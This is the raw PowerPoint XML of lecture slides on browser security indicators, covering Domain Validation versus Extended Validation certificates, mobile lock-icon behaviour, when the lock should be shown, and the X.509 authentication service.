          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="4673520" y="3809880"/>
              <a:ext cx="888480" cy="360"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="textAreaLeft" fmla="*/ 0 w 888480"/>
                <a:gd name="textAreaRight" fmla="*/ 888840 w 8884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89000" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="888999" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="0" y="0"/>
                  </a:lnTo>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:noFill/>
            <a:ln w="158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object 8"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="4648320" y="3746519"/>
              <a:ext cx="126720" cy="12672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27000" h="127000" fill="norm" stroke="1" extrusionOk="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76200" y="63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8" name="object 9"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="4597200" y="3508920"/>
              <a:ext cx="965520" cy="148320"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="textAreaLeft" fmla="*/ 0 w 965520"/>
                <a:gd name="textAreaRight" fmla="*/ 965880 w 96552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965835" h="148589" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="965495" y="148537"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="0" y="0"/>
                  </a:lnTo>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:noFill/>
            <a:ln w="158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object 10"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="4572000" y="3461760"/>
              <a:ext cx="135000" cy="125280"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="textAreaLeft" fmla="*/ 0 w 135000"/>
                <a:gd name="textAreaRight" fmla="*/ 135360 w 13500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35254" h="125729" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="135178" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="0" y="43450"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="115867" y="125524"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="75313" y="55037"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13517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39576031" name="object 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="5641200" y="3326400"/>
            <a:ext cx="3128760" cy="3540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19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726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difference?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50480">
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="879"/>
              </a:spcBef>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" strike="noStrike" spc="-1">
                <a:solidFill>
                  <a:srgbClr val="000099"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>Domain</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2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99"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>Validation</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" strike="noStrike" spc="-97">
                <a:solidFill>
                  <a:srgbClr val="000099"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" strike="noStrike" spc="-21">
                <a:solidFill>
                  <a:srgbClr val="000099"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>(DV)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50480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vs.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50480">
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" strike="noStrike" spc="-1">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>Extended</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" strike="noStrike" spc="-105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8000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>Validation</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" strike="noStrike" spc="-97">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" strike="noStrike" spc="-21">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>(EV)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8200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="2319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Means</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="24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what?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931922" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" idx="5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310CF91-7478-4526-A0F6-057835E8FCC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80197814" name="object 2"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="1076400" y="1557360"/>
            <a:ext cx="5142960" cy="1943280"/>
            <a:chOff x="1076400" y="1557360"/>
            <a:chExt cx="5142960" cy="1943280"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="53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76400" y="1557360"/>
              <a:ext cx="5142960" cy="1847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34" name="object 4"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="4292280" y="3281040"/>
              <a:ext cx="1270440" cy="219240"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="textAreaLeft" fmla="*/ 0 w 1270440"/>
                <a:gd name="textAreaRight" fmla="*/ 1270800 w 127044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1270635" h="219710" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="1270370" y="219512"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="0" y="0"/>
                  </a:lnTo>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:noFill/>
            <a:ln w="158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object 5"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="4267080" y="3235680"/>
              <a:ext cx="136080" cy="12528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36525" h="125729" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="135957" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="0" y="40947"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="114333" y="125144"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="75087" y="53922"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13595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6" name="object 6"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="4289040" y="2756160"/>
              <a:ext cx="1273320" cy="744480"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="textAreaLeft" fmla="*/ 0 w 1273320"/>
                <a:gd name="textAreaRight" fmla="*/ 1273680 w 1273320"/>
                <a:gd name="textAreaTop" fmla="*/ 0 h 744480"/>
                <a:gd name="textAreaBottom" fmla="*/ 744840 h 744480"/>
              </a:gdLst>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="textAreaLeft" t="textAreaTop" r="textAreaRight" b="textAreaBottom"/>
              <a:pathLst>
                <a:path w="1273810" h="744854" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="1273471" y="744419"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="0" y="0"/>
                  </a:lnTo>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:noFill/>
            <a:ln w="158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7" name="object 7"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="4267080" y="2743200"/>
              <a:ext cx="141840" cy="11916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w="142239" h="119380" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="0" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="77595" y="118912"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="65784" y="38455"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="141687" y="9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95330742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Mobile</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="4000" b="0" strike="noStrike" spc="-9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Browsing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5675797" name="object 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="7253280" y="1143000"/>
            <a:ext cx="1204920" cy="369720"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst>
              <a:gd name="textAreaLeft" fmla="*/ 0 w 1204920"/>
              <a:gd name="textAreaRight" fmla="*/ 1205280 w 120492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1205229" h="370205" fill="norm" stroke="1" extrusionOk="0">
                <a:moveTo>
                  <a:pt x="1204911" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="369887"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1204911" y="369887"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="120491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405270" name="object 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="7332120" y="1176120"/>
            <a:ext cx="10389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[Schultze]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612778" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" idx="5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9F3FDAD-1DF1-4FC6-9EBD-4491918D17EE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183983" name="object 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1297800" y="3385800"/>
            <a:ext cx="7652160" cy="222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428004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Same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lock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DV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EV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19"/>
              </a:spcBef>
              <a:tabLst>
                <a:tab pos="271224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Windows</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="24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Phone</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="24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7: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	same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behavior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679840">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="496"/>
              </a:spcBef>
              <a:tabLst>
                <a:tab pos="271224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but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only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when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URL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bar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present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679840">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="621"/>
              </a:spcBef>
              <a:tabLst>
                <a:tab pos="271224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landscape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mode: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no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URL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bar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329853" name="object 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="485280" y="5787720"/>
            <a:ext cx="6692400" cy="82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ts val="2100"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="221"/>
              </a:spcBef>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" u="sng" strike="noStrike" spc="-21">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
                <a:hlinkClick r:id="rId4" tooltip=""/>
              </a:rPr>
              <a:t>http://www.freedom-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" u="sng" strike="noStrike" spc="-11">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
                <a:hlinkClick r:id="rId4" tooltip=""/>
              </a:rPr>
              <a:t>to-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" u="sng" strike="noStrike" spc="-26">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
                <a:hlinkClick r:id="rId4" tooltip=""/>
              </a:rPr>
              <a:t>tinker.com/blog/sjs/web-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" u="sng" strike="noStrike" spc="-11">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
                <a:hlinkClick r:id="rId4" tooltip=""/>
              </a:rPr>
              <a:t>browser-security-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" u="sng" strike="noStrike" spc="-11">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>user-interfaces-hard-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" u="sng" strike="noStrike" spc="-21">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>get-right-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" u="sng" strike="noStrike" spc="-11">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>and-increasingly-inconsistent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8581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Extended</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="4000" b="0" strike="noStrike" spc="-10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Validation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(EV)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5335024" name="object 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="536040" y="1633320"/>
            <a:ext cx="8161920" cy="870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556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request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must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approved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human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lawyer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authority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1745832" name="object 4"/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1205640" y="2727360"/>
            <a:ext cx="5163480" cy="3755160"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1025157344" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" idx="6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3DCA664C-CAC0-418D-9557-1E56BAA0C96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3468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Questions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about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EV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492666" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" idx="6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EB2EE33A-1BE9-4379-BBD0-3B009BE8494C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70175" name="object 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="536040" y="1555560"/>
            <a:ext cx="8316720" cy="5411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does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EV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mean?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difference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between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HTTPS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connection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regular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an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connection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EV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If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attacker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somehow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obtained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non-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EV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bank.com,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inject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script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into </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" u="sng" strike="noStrike" spc="-11">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
                <a:hlinkClick r:id="rId3" tooltip=""/>
              </a:rPr>
              <a:t>https://bank.com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content?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1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What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origin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script?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Can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access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or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modify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content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that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arrived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from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actual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bank.com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via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HTTPS?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94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would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browser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show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blue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or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green?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59331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When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Should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The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Lock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Be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Shown?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6997141" name="object 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="536040" y="2622240"/>
            <a:ext cx="7650000" cy="4284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45960" indent="-333360">
              <a:lnSpc>
                <a:spcPct val="118000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="99"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="008080"/>
              </a:buClr>
              <a:buFont typeface="Lucida Sans Unicode"/>
              <a:buChar char="◆"/>
              <a:tabLst>
                <a:tab pos="345960" algn="l"/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All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elements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page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fetched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HTTPS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all</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2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elements: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2000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="570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issued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authority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(CA)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trusted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browser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HTTPS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valid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–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C00000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>means</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" strike="noStrike" spc="-35">
                <a:solidFill>
                  <a:srgbClr val="C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C00000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>what?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65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Common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Name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matches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domain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name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URL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72935307" name="object 4"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="1828800" y="1525680"/>
            <a:ext cx="3962160" cy="874440"/>
            <a:chOff x="1828800" y="1525680"/>
            <a:chExt cx="3962160" cy="874440"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="554" name="object 5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828800" y="1525680"/>
              <a:ext cx="3962160" cy="874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55" name="object 6"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="4724280" y="1752480"/>
              <a:ext cx="380520" cy="38052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381000" h="381000" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="0" y="190499"/>
                  </a:move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7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7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close/>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:noFill/>
            <a:ln w="2857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70642460" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" idx="6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595F4BF2-A5D4-4B66-B90D-86ED8226EE93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60246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X.509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Authentication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Service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080988" name="object 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="533520" y="5334120"/>
            <a:ext cx="2666519" cy="761760"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst>
              <a:gd name="textAreaLeft" fmla="*/ 0 w 2666520"/>
              <a:gd name="textAreaRight" fmla="*/ 2666880 w 266652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2667000" h="762000" fill="norm" stroke="1" extrusionOk="0">
                <a:moveTo>
                  <a:pt x="0" y="380999"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="7332" y="340805"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="28837" y="301817"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="63778" y="264245"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="111417" y="228300"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="171017" y="194193"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="241841" y="162133"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="281231" y="146938"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="323151" y="132333"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="367509" y="118346"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="414211" y="105002"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="463167" y="92329"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="514283" y="80351"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="567468" y="69097"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="622629" y="58592"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="679675" y="48862"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="738513" y="39933"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="799052" y="31833"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="861198" y="24587"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="924859" y="18222"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="989945" y="12764"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1056361" y="8239"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1124017" y="4674"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1192820" y="2094"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1262678" y="528"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1333499" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1404320" y="528"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1474178" y="2094"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1542981" y="4674"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1610637" y="8239"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1677054" y="12764"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1742139" y="18222"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1805801" y="24587"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1867947" y="31833"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1928485" y="39933"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1987323" y="48862"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2044369" y="58592"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2099531" y="69097"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2152716" y="80351"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2203832" y="92329"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2252787" y="105002"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2299490" y="118346"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2343847" y="132333"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2385767" y="146938"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2425158" y="162133"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2461926" y="177894"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2527231" y="211003"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2580942" y="246056"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2622325" y="282841"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2650640" y="321147"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2665150" y="360765"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2666999" y="380999"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2665150" y="401234"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2650640" y="440851"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2622325" y="479158"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2580942" y="515943"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2527231" y="550995"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2461926" y="584105"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2425158" y="599865"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2385767" y="615061"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2343847" y="629666"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2299490" y="643653"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2252787" y="656997"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2203832" y="669670"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2152716" y="681647"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2099531" y="692902"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2044369" y="703407"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1987323" y="713137"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1928485" y="722066"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1867947" y="730166"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1805801" y="737412"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1742139" y="743777"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1677054" y="749235"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1610637" y="753760"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1542981" y="757325"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1474178" y="759904"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1404320" y="761471"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1333499" y="761999"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1262678" y="761471"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1192820" y="759904"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1124017" y="757325"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1056361" y="753760"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="989945" y="749235"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="924859" y="743777"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="861198" y="737412"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="799052" y="730166"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="738513" y="722066"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="679675" y="713137"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="622629" y="703407"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="567468" y="692902"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="514283" y="681647"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="463167" y="669670"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="414211" y="656997"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="367509" y="643653"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="323151" y="629666"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="281231" y="615061"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="241841" y="599865"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="205072" y="584105"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="139768" y="550995"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="86056" y="515943"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="44674" y="479158"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="16359" y="440851"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1848" y="401234"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="380999"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:noFill/>
          <a:ln w="2857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146940" name="object 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="536040" y="1555560"/>
            <a:ext cx="7684920" cy="573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Internet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standard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(1988-2000)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Specifies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format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X.509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are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IPsec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SSL/TLS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72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Specifies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directory</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" strike="noStrike" spc="-10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service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retrieving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other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users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CA-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certified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public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keys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72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Specifies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set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authentication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protocols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proving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identity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using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public-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signatures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56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with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digital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signature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scheme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and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hash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function,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but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must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hash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before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signing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536840">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="2095"/>
              </a:spcBef>
              <a:tabLst>
                <a:tab pos="355680" algn="l"/>
              </a:tabLst>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="0" strike="noStrike" spc="-1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>Remember</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="0" strike="noStrike" spc="-6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FF0000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>MD5?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206453" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" idx="6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1DBBFDFF-218A-44A1-89D2-9805D487929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48005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X.509</a:t>
            </a:r>
            <a:r>
